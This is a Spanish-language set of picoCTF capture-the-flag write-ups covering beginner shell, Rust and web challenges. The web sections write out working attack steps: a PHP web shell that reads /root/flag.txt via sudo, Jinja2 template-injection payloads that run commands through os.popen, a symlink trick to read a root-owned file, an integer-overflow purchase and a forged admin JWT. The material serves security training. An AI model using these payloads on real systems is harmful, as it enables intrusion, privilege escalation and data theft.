# General Skills

## FANTASY CTF

Play this short game to get familiar with terminal applications and some of the most important rules in scope for picoCTF. Connect to the program with netcat:`$ nc verbal-sleep.picoctf.net 57327`.

When a choice is presented like \[a/b/c], choose one, for example: `c` and then press Enter.

1. Nos conectamos al sevidor
```
`nc verbal-sleep.picoctf.net 57327`
```

2. Jugamos un pequeño juego de roles
```
opción A
opción A
obtenemos la bandera: picoCTF{m1113n1um_3d1710n_5e40d7b5}
```



## HashingJobApp

If you want to hash with the best, beat this test! `nc saturn.picoctf.net 52003`
You can use a commandline tool or web app to hash text
Press Ctrl and c on your keyboard to close your connection and return to the command prompt.

1. Ingresamos al servidor
```
nc saturn.picoctf.net 52003
```

2. Usamos la herramienta https://www.md5hashgenerator.com/ para generar los hash md5
```
Please md5 hash the text between quotes, excluding the quotes: 'Confucius'
Answer: 
286bd9ea520691c9f2018dc96db3ce31
Correct.
Please md5 hash the text between quotes, excluding the quotes: 'angry hornets'
Answer: 
456fdc871d3f9976046da83bcfdd52ff+
Correct.
Please md5 hash the text between quotes, excluding the quotes: 'chickens'
Answer: 
3a6ad3cffd52913dfafce6761c0424a7
Correct.
```

3. Obtenemos la bandera
```
picoCTF{4ppl1c4710n_r3c31v3d_3eb82b73}
```



## Python Wrangling

Python scripts are invoked kind of like programs in the Terminal... Can you run [this Python script](https://mercury.picoctf.net/static/1b247b1631eb377d9392bfa4871b2eb1/ende.py) using [this password](https://mercury.picoctf.net/static/1b247b1631eb377d9392bfa4871b2eb1/pw.txt) to get [the flag](https://mercury.picoctf.net/static/1b247b1631eb377d9392bfa4871b2eb1/flag.txt.en)?
Get the Python script accessible in your shell by entering the following command in the Terminal prompt: `$ wget https://mercury.picoctf.net/static/1b247b1631eb377d9392bfa4871b2eb1/ende.py`
``$ man python``

1. Descargamos los 3 archivos que nos indica el problema
```
wget https://mercury.picoctf.net/static/1b247b1631eb377d9392bfa4871b2eb1/ende.py

wget https://mercury.picoctf.net/static/1b247b1631eb377d9392bfa4871b2eb1/flag.txt.en

wget https://mercury.picoctf.net/static/1b247b1631eb377d9392bfa4871b2eb1/pw.txt    
```

2. Extraemos lo que hay en flag.txt y pw.txt
```
cat flag.txt.en

output: gAAAAABgUAIWuksW6PU7W1WFXiBWkF2S8VhtL_5335iazHhuBnWloiyt3ZAFwR2zyuG7iZLSVPaQIZLTxgo-WXIk6Cnk7-KZm1g1qo_v1zDMK5wDocmVFxL0o5ae6OrB9VKdh3HerIsy 
```

```
cat pw.txt

output: dbd1bea4dbd1bea4dbd1bea4dbd1bea4
```

3. Usamos el código en Python para desencriptar la bandera. Para usar el código necesitamos la contraseña en pw
```
python ende.py -d flag.txt.en
Please enter the password:dbd1bea4dbd1bea4dbd1bea4dbd1bea4
```

4. Obtenemos la bandera
```
picoCTF{4p0110_1n_7h3_h0us3_dbd1bea4}
```



## Rust fixme 1

Have you heard of Rust? Fix the syntax errors in this Rust file to print the flag!Download the Rust code [here](https://challenge-files.picoctf.net/c_verbal_sleep/3f0e13f541928f420d9c8c96b06d4dbf7b2fa18b15adbd457108e8c80a1f5883/fixme1.tar.gz).
Cargo is Rust's package manager and will make your life easier. See the getting started page [here](https://doc.rust-lang.org/book/ch01-03-hello-cargo.html)
[println!](https://doc.rust-lang.org/std/macro.println.html)
Rust has some pretty great compiler error messages. Read them maybe?

1. Descargamos la carpeta comprimida
```
wget https://challenge-files.picoctf.net/c_verbal_sleep/3f0e13f541928f420d9c8c96b06d4dbf7b2fa18b15adbd457108e8c80a1f5883/fixme1.tar.gz
```

2. Extraemos los archivos de la carpeta
```
tar -xvzf fixme1.tar.gz
```

3. Entramos a la carpeta
```
cd fixme1
```

4. Compilamos el archivo main.rs. Lanza errores así que entramos al editor de texto para buscarlos y corregirlos
```
cd src
nano main.rs
```

```rust
use xor_cryptor::XORCryptor;
 
fn main() {
    // Key for decryption
    let key = String::from("CSUCKS"); // How do we end statements in Rust?

    // Encrypted flag values
    let hex_values = ["41", "30", "20", "63", "4a", "45", "54", "76", "01", "1c", "7e", "59", "63", "e1", "61", "25", "7f", "5a", "60", "50", "11", "38", "1f", "3a", >

    // Convert the hexadecimal strings to bytes and collect them into a vector
    let encrypted_buffer: Vec<u8> = hex_values.iter()
        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
        .collect();

    // Create decrpytion object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        ret; // How do we return in rust?
    }
    let xrc = res.unwrap();

    // Decrypt flag and print it out
    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
    println!(
        ":?", // How do we print out a variable in the println function? 
        String::from_utf8_lossy(&decrypted_buffer)
    );
}
```

```rust
/// Corregimos

use xor_cryptor::XORCryptor;
 
fn main() {
    // Key for decryption
    let key = String::from("CSUCKS"); // How do we end statements in Rust?

    // Encrypted flag values
    let hex_values = ["41", "30", "20", "63", "4a", "45", "54", "76", "01", "1c", "7e", "59", "63", "e1", "61", "25", "7f", "5a", "60", "50", "11", "38", "1f", "3a", >

    // Convert the hexadecimal strings to bytes and collect them into a vector
    let encrypted_buffer: Vec<u8> = hex_values.iter()
        .map(|&hex| u8::from_str_radix(hex, 16).unwrap())
        .collect();

    // Create decrpytion object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return; // How do we return in rust?
    }
    let xrc = res.unwrap();

    // Decrypt flag and print it out
    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
    println!(
        "{}:?", // How do we print out a variable in the println function? 
        String::from_utf8_lossy(&decrypted_buffer)
    );
}
```

5. Compilamos y ejecutamos el código
```
cargo build
output: 
Compiling rust_proj v0.1.0 (/home/sailork/fixme1)
Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.69s

cargo run
ouput: 
Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.02s
Running `/home/sailork/fixme1/target/debug/rust_proj`
```

6. Obtenemos la bandera
```
picoCTF{4r3_y0u_4_ru$t4c30n_n0w?}
```




## Rust fixme 2

The Rust saga continues? I ask you, can I borrow that, pleeeeeaaaasseeeee?Download the Rust code [here](https://challenge-files.picoctf.net/c_verbal_sleep/babfbee79718a6363826ba86300173ffde6d81577e9dd07d4130c53a7eecf6c3/fixme2.tar.gz).
https://doc.rust-lang.org/book/ch04-02-references-and-borrowing.html

1. Descargamos la carpeta y extraemos su contenido
```
wget https://challenge-files.picoctf.net/c_verbal_sleep/babfbee79718a6363826ba86300173ffde6d81577e9dd07d4130c53a7eecf6c3/fixme2.tar.gz

tar -xvzf fixme2.tar.gz
```

2. Entramos a la carpeta y compilamos el programa
```
cd fixme2

build cargo
```

3. Detectamos errores de compilación así que vamos a corregirlos
```
cd src

nano main.rs
```

```rust
// ORIGINAL
use xor_cryptor::XORCryptor;

fn decrypt(encrypted_buffer:Vec<u8>, borrowed_string: &String){ // How do we pass>

    // Key for decryption
    let key = String::from("CSUCKS");

    // Editing our borrowed value
    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");

    // Create decrpytion object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return; // How do we return in rust?
    }
    let xrc = res.unwrap();

    // Decrypt flag and print it out
    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
    borrowed_string.push_str(&String::from_utf8_lossy(&decrypted_buffer));
    println!("{}", borrowed_string);
}
```

```rust
// CORREGIO                                  
use xor_cryptor::XORCryptor;

fn decrypt(encrypted_buffer:Vec<u8>, borrowed_string: &mut String){ // How do we >

    // Key for decryption
    let key = String::from("CSUCKS");

    // Editing our borrowed value
    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");

    // Create decrpytion object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return; // How do we return in rust?
    }
    let xrc = res.unwrap();

    // Decrypt flag and print it out
    let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);
    borrowed_string.push_str(&String::from_utf8_lossy(&decrypted_buffer));
    println!("{}", borrowed_string);
}
```

4. Compilamos y ejecutamos
```
cargo build

cargo run
```

5. Obtenemos la bandera
```
picoCTF{4r3_y0u_h4v1n5_fun_y31?}
```



## Rust fixme 3

Have you heard of Rust? Fix the syntax errors in this Rust file to print the flag!Download the Rust code [here](https://challenge-files.picoctf.net/c_verbal_sleep/dcdaf491b35c1d0f5075e9583edbbb7aaea1dffb6ad32bc000e4d87b5200ff7b/fixme3.tar.gz).
Read the comments...darn it!

1. Descargamos el archivo adjunto y extraemos la carpeta comprimida
```
wget https://challenge-files.picoctf.net/c_verbal_sleep/dcdaf491b35c1d0f5075e9583edbbb7aaea1dffb6ad32bc000e4d87b5200ff7b/fixme3.tar.gz

tar -xvzf fixme3.tar.gz 
```

2. Intentamos compilar el programa, pero tenemos un error y debemos corregirlo
```
cd fixme3

cd src

nano main.rs
```

```rust
use xor_cryptor::XORCryptor;

fn decrypt(encrypted_buffer: Vec<u8>, borrowed_string: &mut String) {
    // Key for decryption
    let key = String::from("CSUCKS");

    // Editing our borrowed value
    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");

    // Create decryption object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return;
    }
    let xrc = res.unwrap();

    // Did you know you have to do "unsafe operations in Rust?
    // https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html
    // Even though we have these memory safe languages, sometimes we need to do things outside of the rules
    // This is where unsafe rust comes in, something that is important to know about in order to keep things in perspective

    // unsafe { -- DEBEMOS DESCOMENTAR ESTO
        // Decrypt the flag operations 
        let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);

        // Creating a pointer 
        let decrypted_ptr = decrypted_buffer.as_ptr();
        let decrypted_len = decrypted_buffer.len();

        // Unsafe operation: calling an unsafe function that dereferences a raw pointer
        let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);

        borrowed_string.push_str(&String::from_utf8_lossy(decrypted_slice));
    // } -- DEBEMOS DESCOMENTAR ESTO
    println!("{}", borrowed_string);
}
```

```rust
use xor_cryptor::XORCryptor;

fn decrypt(encrypted_buffer: Vec<u8>, borrowed_string: &mut String) {
    // Key for decryption
    let key = String::from("CSUCKS");

    // Editing our borrowed value
    borrowed_string.push_str("PARTY FOUL! Here is your flag: ");

    // Create decryption object
    let res = XORCryptor::new(&key);
    if res.is_err() {
        return;
    }
    let xrc = res.unwrap();

    // Did you know you have to do "unsafe operations in Rust?
    // https://doc.rust-lang.org/book/ch19-01-unsafe-rust.html
    // Even though we have these memory safe languages, sometimes we need to do things outside of the rules
    // This is where unsafe rust comes in, something that is important to know about in order to keep things in perspective

    unsafe {
        // Decrypt the flag operations 
        let decrypted_buffer = xrc.decrypt_vec(encrypted_buffer);

        // Creating a pointer 
        let decrypted_ptr = decrypted_buffer.as_ptr();
        let decrypted_len = decrypted_buffer.len();

        // Unsafe operation: calling an unsafe function that dereferences a raw pointer
        let decrypted_slice = std::slice::from_raw_parts(decrypted_ptr, decrypted_len);

        borrowed_string.push_str(&String::from_utf8_lossy(decrypted_slice));
    }
    println!("{}", borrowed_string);
}
```

3. Compilamos y ejecutamos. Obtenemos la bandera
```
cargo build 
   Compiling rust_proj v0.1.0 (/home/sailork/fixme3)
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.79s

cargo run  
    Finished `dev` profile [unoptimized + debuginfo] target(s) in 0.03s
     Running `/home/sailork/fixme3/target/debug/rust_proj`
Using memory unsafe languages is a: PARTY FOUL! Here is your flag: picoCTF{n0w_y0uv3_f1x3d_1h3m_411}
```



## dont-you-love-banners

Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 54013`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 54783`. From the above information abuse the machine and find the flag in the /root directory.

Do you know about symlinks?
Maybe some small password cracking or guessing

1. Ingresamos al primer puerto mencionado y obtenemos lo que parece ser una contraseña
```
nc tethys.picoctf.net 54013
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```

2. Ingresamos al segundo puerto y accedemos con la contraseña que acabamos de recibir, además de responder algunas preguntas
```
nc tethys.picoctf.net 54783
*************************************
**************WELCOME****************
*************************************

what is the password? 
My_Passw@rd_@1234
What is the top cyber security conference in the world?
DEFCON
the first hacker ever was known for phreaking(making free phone calls), who was it?
John Draper
```

3. Inspeccionamos en busca de pistas
```
player@challenge:~$ ls -al
ls -al
total 20
drwxr-xr-x 1 player player   20 Mar  9  2024 .
drwxr-xr-x 1 root   root     20 Mar  9  2024 ..
-rw-r--r-- 1 player player  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 player player 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 player player  807 Apr  4  2018 .profile
-rw-r--r-- 1 player player  114 Feb  7  2024 banner
-rw-r--r-- 1 root   root     13 Feb  7  2024 text

player@challenge:~$ cat banner
cat banner
*************************************
**************WELCOME****************
*************************************

player@challenge:~$ cat text
cat text
keep digging

layer@challenge:~$ ls -al /root
ls -al /root
total 16
drwxr-xr-x 1 root root    6 Mar 12  2024 .
drwxr-xr-x 1 root root   29 Apr 15 01:02 ..
-rw-r--r-- 1 root root 3106 Apr  9  2018 .bashrc
-rw-r--r-- 1 root root  148 Aug 17  2015 .profile
-rwx------ 1 root root   46 Mar 12  2024 flag.txt
-rw-r--r-- 1 root root 1317 Feb  7  2024 script.py
```

4. Encontramos un script que imprimía el banner y verificaba las respuestas de seguridad
```
player@challenge:~$ cat /root/script.py
cat /root/script.py
```

```python
import os
import pty

incorrect_ans_reply = "Lol, good try, try again and good luck\n"

if __name__ == "__main__":
    try:
      with open("/home/player/banner", "r") as f:
        print(f.read())
    except:
      print("*********************************************")
      print("***************DEFAULT BANNER****************")
      print("*Please supply banner in /home/player/banner*")
      print("*********************************************")

try:
    request = input("what is the password? \n").upper()
    while request:
        if request == 'MY_PASSW@RD_@1234':
            text = input("What is the top cyber security conference in the world?\n").upper()
            if text == 'DEFCON' or text == 'DEF CON':
                output = input(
                    "the first hacker ever was known for phreaking(making free phone calls), who was it?\n").upper()
                if output == 'JOHN DRAPER' or output == 'JOHN THOMAS DRAPER' or output == 'JOHN' or output== 'DRAPER':
                    scmd = 'su - player'
                    pty.spawn(scmd.split(' '))

                else:
                    print(incorrect_ans_reply)
            else:
                print(incorrect_ans_reply)
        else:
            print(incorrect_ans_reply)
            break

except:
    KeyboardInterrupt
```


5. Eliminamos el banner y creamos un enlace que apunte a flag.txt 
```
player@challenge:~$ rm /home/player/banner
rm /home/player/banner

player@challenge:~$ ln -s /root/flag.txt /home/player/banner
ln -s /root/flag.txt /home/player/banner

player@challenge:~$ ^C
```

6. Volvemos a ingresar y obtenemos la bandera
```
nc tethys.picoctf.net 54783
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}

what is the password? 
```



## flag_shop

There's a flag shop selling stuff, can you buy a flag? [Source](https://jupiter.challenges.picoctf.org/static/dd28f0987f28c894f35d5d48564c3402/store.c). Connect with `nc jupiter.challenges.picoctf.org 44566`.

Two's compliment can do some weird things when numbers get really big!

1. Descargamos el archivo adjunto, lo exploramos y encontramos un código en C que el mismo que se ejecuta cuando nos conectamos al puerto. Podemos observar que necesitamos 100,000 dólares para comprar la bandera, pero nosotros sólo tenemos 1,100, así que aprovechamos que se están usando valores con signo para provocar un overflow y así nuestro saldo se incremente y podamos comprar la bandera.

```c
#include <stdio.h>
#include <stdlib.h>
int main()
{
    setbuf(stdout, NULL);
    int con;
    con = 0;
    int account_balance = 1100;
    while(con == 0){
        
        printf("Welcome to the flag exchange\n");
        printf("We sell flags\n");

        printf("\n1. Check Account Balance\n");
        printf("\n2. Buy Flags\n");
        printf("\n3. Exit\n");
        int menu;
        printf("\n Enter a menu selection\n");
        fflush(stdin);
        scanf("%d", &menu);
        if(menu == 1){
            printf("\n\n\n Balance: %d \n\n\n", account_balance);
        }
        else if(menu == 2){
            printf("Currently for sale\n");
            printf("1. Defintely not the flag Flag\n");
            printf("2. 1337 Flag\n");
            int auction_choice;
            fflush(stdin);
            scanf("%d", &auction_choice);
            if(auction_choice == 1){
                printf("These knockoff Flags cost 900 each, enter desired quantity\n");
                
                int number_flags = 0;
                fflush(stdin);
                scanf("%d", &number_flags);
                if(number_flags > 0){
                    int total_cost = 0;
                    total_cost = 900*number_flags;
                    printf("\nThe final cost is: %d\n", total_cost);
                    if(total_cost <= account_balance){
                        account_balance = account_balance - total_cost;
                        printf("\nYour current balance after transaction: %d\n\n", account_balance);
                    }
                    else{
                        printf("Not enough funds to complete purchase\n");
                    }
                                    
                    
                }
                    
                    
                    
                
            }
            else if(auction_choice == 2){
                printf("1337 flags cost 100000 dollars, and we only have 1 in stock\n");
                printf("Enter 1 to buy one");
                int bid = 0;
                fflush(stdin);
                scanf("%d", &bid);
                
                if(bid == 1){
                    
                    if(account_balance > 100000){
                        FILE *f = fopen("flag.txt", "r");
                        if(f == NULL){

                            printf("flag not found: please run this on the server\n");
                            exit(0);
                        }
                        char buf[64];
                        fgets(buf, 63, f);
                        printf("YOUR FLAG IS: %s\n", buf);
                        }
                    
                    else{
                        printf("\nNot enough funds for transaction\n\n\n");
                    }}

            }
        }
        else{
            con = 1;
        }

    }
    return 0;
}
```

2. Debemos comprar (2³¹ + 100,000) / 900 banderas falsas para provocar el desbordamiento. Este proceso lo deberemos repetir hasta obtener los 100,000 dórales para comprar la bandera real
```
nc jupiter.challenges.picoctf.org 44566
```

```
Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
1



 Balance: 1100 --- INICIO


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
1         
These knockoff Flags cost 900 each, enter desired quantity
2147482801 --- COMPRAR LAS BANDERAS FALSAS

The final cost is: -762300 --- OVERFLOW

Your current balance after transaction: 763400 --- NUEVO SALDO A FAVOR


Welcome to the flag exchange
We sell flags

1. Check Account Balance

2. Buy Flags

3. Exit

 Enter a menu selection
2
Currently for sale
1. Defintely not the flag Flag
2. 1337 Flag
2
1337 flags cost 100000 dollars, and we only have 1 in stock
Enter 1 to buy one1 --- COMPRAR LA BANDERA REAL
YOUR FLAG IS: picoCTF{m0n3y_bag5_68d16363}
```



## SansAlpha

The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.`ssh -p 60168 ctf-player@mimas.picoctf.net`Use password: `1db87a14`

Where can you get some letters?

1. Nos conectamos al servidor
```
ssh -p 60168 ctf-player@mimas.picoctf.net
ctf-player@mimas.picoctf.net's password: 1db87a14
```

2. Observamos que no podemos usar comandos comunes como `ls` o `cd`, así que exploramos el sistema usando patrones de búsqueda utilizando comodines. 
```
SansAlpha$ /*/???[!_]64 /????.*
```
- `` /*/???[!_]64`` Busca en cualquier directorio (/*/) archivos que tengan tres caracteres, luego el número 64, y NO contengan el carácter _.
- ``*/????.* ``Busca archivos con cuatro caracteres seguidos de un punto (.) y cualquier extensión.

3. Encontramos una cadena codificada en base 64. La decodificamos.
```
echo cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV80OTQ1NjMwYX0= | base64 -d
```

4. Obtenemos la bandera.
```
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_4945630a}
```



## Specialer

Reception of Special has been cool to say the least. That's why we made an exclusive version of Special, called Secure Comprehensive Interface for Affecting Linux Empirically Rad, or just 'Specialer'. With Specialer, we really tried to remove the distractions from using a shell. Yes, we took out spell checker because of everybody's complaining. But we think you will be excited about our new, reduced feature set for keeping you focused on what needs it the most. Please start an instance to test your very own copy of Specialer. ssh -p 65258 ctf-player@saturn.picoctf.net. The password is af86add3

What programs do you have access to?

1. Nos conectamos al servidor
```
ssh -p 65258 ctf-player@saturn.picoctf.net
ctf-player@saturn.picoctf.net's password: af86add3
```

2. Usamos ``help`` para saber los comandos que podemos utilizar, uno de ellos siendo ``cd`` con el cual nos desplazamos a través de las carpetas aparentemente ocultas
```
Specialer$ cd 
.hushlogin  .profile    abra/       ala/        sim/
```

3. Primero, revisamos la carpeta abra
```
Specialer$ cd abra
Specialer$ cd cada
cadabra.txt   cadaniel.txt 
```

4. Revisamos los archivo de texto
```
Specialer$ echo "$(<cadabra.txt)"
Nothing up my sleeve!
Specialer$ echo "$(<cadaniel.txt)"
Yes, I did it! I really did it! I'm a true wizard!
```

5. No encontramos nada, así que vamos a la siguiente carpeta
```
Specialer$ cd ..
Specialer$ cd ala/
Specialer$ cd 
kazam.txt  mode.txt
```

6. Revisamos los archivos de texto y encontramos la bandera
```
Specialer$ cd echo "$(<mode.txt)"
-bash: cd: too many arguments
Specialer$ echo "$(<mode.txt)"
Yummy! Ice cream!
Specialer$ echo "$(<kazam.txt)"
return 0 picoCTF{y0u_d0n7_4ppr3c1473_wh47_w3r3_d01ng_h3r3_a8567b6f}
```



# Web

## Bookmarklet

Why search for the flag when I can make a bookmarklet to print it for me? Browse here, and find the flag!
A bookmarklet is a bookmark that runs JavaScript instead of loading a webpage.
What happens when you click a bookmarklet?
Web browsers have other ways to run JavaScript too.

1. Ingresamos al sitio web
2. Vemos que hay un apartado en el que, al hacer click, copia en el portapapeles un código de js. Este código se encarga de desencriptar la bandera
```js
        javascript:(function() {
            var encryptedFlag = "àÒÆÞ¦È¬ëÙ£ÖÓÚåÛÑ¢ÕÓÒËÉ§©í";
            var key = "picoctf";
            var decryptedFlag = "";
            for (var i = 0; i < encryptedFlag.length; i++) {
                decryptedFlag += String.fromCharCode((encryptedFlag.charCodeAt(i) - key.charCodeAt(i % key.length) + 256) % 256);
            }
            alert(decryptedFlag);
        })();
    
```
3. Vamos a un compilador de js online y obtenemos la bandera
```
picoCTF{p@g3_turn3r_6bbf8953}
```



## Cookie Monster Secret Recipe

Cookie Monster has hidden his top-secret cookie recipe somewhere on his website. As an aspiring cookie detective, your mission is to uncover this delectable secret. Can you outsmart Cookie Monster and find the hidden recipe? You can access the Cookie Monster here and good luck

Sometimes, the most important information is hidden in plain sight. Have you checked all parts of the webpage?
Cookies aren't just for eating - they're also used in web technologies!
Web browsers often have tools that can help you inspect various aspects of a webpage, including things you can't see directly.

1. Vamos al sitio web
2. Intentamos ingresar con credenciales genéricas, pero no podemos acceder
```
usuer: admin
password: password

output:
Access Denied
Cookie Monster says: 'Me no need password. Me just need cookies!'
Hint: Have you checked your cookies lately?
```

3. Revisamos las cookies y encontramos esto:
```
name: secret_recipie
value: cGljb0NURntjMDBrMWVfbTBuc3Rlcl9sMHZlc19jMDBraWVzXzZDMkZCN0YzfQ%3D%3D
```

4. Decodificamos usando cyberchef o ``echo`` y obtenemos:
```
picoCTF{c00k1e_m0nster_l0ves_c00kies_6C2FB7F3}
```



## head-dump

Welcome to the challenge! In this challenge, you will explore a web application and find an endpoint that exposes a file containing a hidden flag. The application is a simple blog website where you can read articles about various topics, including an article about API Documentation. Your goal is to explore the application and find the endpoint that generates files holding the server’s memory, where a secret flag is hidden. The website is running [picoCTF News](http://verbal-sleep.picoctf.net:59675/).

Explore backend development with us.
The head was dumped.

1. Ingresamos al sitio web
2. Revisando sitio encontramos sólo una liga que funciona
3. Dentro de la liga vemos una especie de archivero, uno de ellos con el nombre ``head-dump`` y que contiene un archivo descargable que contiene strings con palabras, números y oraciones
```
curl -X 'GET' \
  'http://verbal-sleep.picoctf.net:49485/heapdump' \
  -H 'accept: */*' > heapdump
```
4. Buscamos la bandera entre esos strings
```
cat heapdump | grep picoCTF
picoCTF{Pat!3nt_15_Th3_K3y_bed6b6b8}
```



## n0s4n1ty 1

A developer has added profile picture upload functionality to a website. However, the implementation is flawed, and it presents an opportunity for you. Your mission, should you choose to accept it, is to navigate to the provided web page and locate the file upload area. Your ultimate goal is to find the hidden flag located in the /root directory. You can access the web application here!

File upload was not sanitized
Whenever you get a shell on a remote machine, check `sudo -l`

1. Ingresamos al sitio web
2. Debemos subir un archivo ``php``, así que creamos uno llamada shell y dentro de él hacemos un código con el podamos acceder a la bandera
```
touch shell.php  

nano shell.php

<?php echo exec("sudo cat /root/flag.txt");?>
```

3. Subimos el archivo y accedemos a él modificando el link del sitio
```
http://standard-pizzas.picoctf.net:56264/uploads/shell.php
```

4. Obtenemos la bandera
```
picoCTF{wh47_c4n_u_d0_wPHP_4043cda3}
```



## SSTI1

I made a cool website where you can announce whatever you want! Try it out! I heard templating is a cool and modular way to build web apps! Check out my website [here](http://rescued-float.picoctf.net:59287/)!

Server Side Template Injection

1. Ingresamos al sitio web. Notamos que utiliza plantillas porque tiene un formulario de entrada para anuncios. Como el sitio usa Python, sospechamos que el motor de las plantillas podría ser Jinja2.
2. Enviamos ``{{3*3}}`` para saber si la entrada es validada como código, y obtenemos ``9``, lo que nos lo confirma.
3. Usamos ``{{.__class__}}`` y obtenemos ``class 'flask.config.Config'``, lo que nos confirma que podemos acceder a atributos internos de objetos en la plantilla, o sea que la plantilla es vulnerable a SSTI.
4. Accedemos a la configuración interna de Flask con ``{{Config.__class__}}`` al obtener ``class 'flask.config.Config'``
5. Probamos si el método ``int`` era accesible con  ``{{Config.__class__.__int__}}`` y obtenemos las variables globales con `{{config.__class__.__init__.__globals__}}`. Descubrimos que ``os`` estaba disponible. 
6. Listamos los archivos del servidor  
```
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}

output:`app.py`, `flag`, `requirements.txt`
```
7. Mostramos el contenido de flag
```
{{config.__class__.__init__.__globals__['os'].popen('cat flag').read()}} 

output: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_753eca43}
```



## findme

Help us test the form by submiting the username as `test` and password as `test!` The website running [here](http://saturn.picoctf.net:61108/).

any redirections?

1. Ingresamos al sitio web
2. Accedemos con el usuario y la contraseña que nos dan
```
user: test
password: test!
```

3. Somos redirigidos 3 veces, siendo la última una página home. Regresamos las páginas anteriores y notamos algo raro en las direcciones
```
http://saturn.picoctf.net:61108/next-page/id=cGljb0NURntwcm94aWVzX2Fs
http://saturn.picoctf.net:61108/next-page/id=bF90aGVfd2F5X2QxYzBiMTEyfQ==
```

4. Extraemos la parte de id de las direcciones que parece estar en base 64, y las desciframos
```
echo cGljb0NURntwcm94aWVzX2FsbF90aGVfd2F5X2QxYzBiMTEyfQ== | base64 -d
picoCTF{proxies_all_the_way_d1c0b112}                                              
```



## Java Code Analysis!?!

BookShelf Pico, my premium online book-reading service. I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book! Here are the credentials to get you started:

- Username: "user"
- Password: "user"

Source code can be downloaded [here](https://artifacts.picoctf.net/c/480/bookshelf-pico.zip). Website can be accessed [here!](http://saturn.picoctf.net:58339/).

Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
The 'role' and 'userId' fields in the JWT can be of interest to you!
The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
Upgrade your 'role' with the _new_ (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.

1. Ingresamos al sitio web
2. Vemos que hay un apartado llamado Flag, intentamos acceder a él pero está bloqueado, sólo el admin es capaz de hacerlo
3. Inspeccionar
4. Storage
5. Local Storage
6. ``http://saturn.picoctf.net:49280``
7. Copiamos lo que hay en auto-token y lo llevamos a jwt.io 
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTc0NTM2MzE5OCwiaWF0IjoxNzQ0NzU4Mzk4LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.dGmOibLcy5nuyf8xAfOWzlvucOGU69Op-RyBVxNSoc0
```
8. Modificamos sus valores en Payload
```json
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1745363623,
  "iat": 1744758823,
  "userId": 1,
  "email": "free"
}
```

```json
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1745363623,
  "iat": 1744758823,
  "userId": 2,
  "email": "admin"
}
```

9. Modificamos sus valores en Verify Signature
```json
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload), your-256-bit-secret
)
```

```json
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload), 1234
)
```

10. Copiamos el nuevo token y lo pegamos en auto-token
```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE3NDUzNjM2MjMsImlhdCI6MTc0NDc1ODgyMywidXNlcklkIjoyLCJlbWFpbCI6ImFkbWluIn0.wR0doqr9-BXkFDuLdRwS6B9UXhgUizT1m2qHXWmLM1I
```

11. Modificamos los valores de token-payload en inspeccionar para que coincidan con los nuevos valores del token
```json
{"role":"Free","iss":"bookshelf","exp":1745363623,"iat":1744758823,"userId":1,"email":"free"}
```

```json
{"role":"Admin","iss":"bookshelf","exp":1745363623,"iat":1744758823,"userId":2,"email":"admin"}
```

12. Recargamos la página y obtenemos la bandera
```
Great job! Here’s your flag:picoCTF{w34k_jwt_n0t_g00d_7745dc02}
```



## SQL Direct


Connect to this PostgreSQL server and find the flag! `psql -h saturn.picoctf.net -p 54467 -U postgres pico` Password is `postgres`

What does a SQL database contain?

1. Nos conectamos al servidor
```
psql -h saturn.picoctf.net -p 54467 -U postgres pico
Contraseña para usuario postgres: postgres
```

2. Usamos ``help`` para ver información sobre los comandos
```
pico=# help
Está usando psql, la interfaz de línea de órdenes de PostgreSQL.
Digite:  \copyright para ver los términos de distribución
       \h para ayuda de órdenes SQL
       \? para ayuda de órdenes psql
       \g o punto y coma («;») para ejecutar la consulta
       \q para salir
```

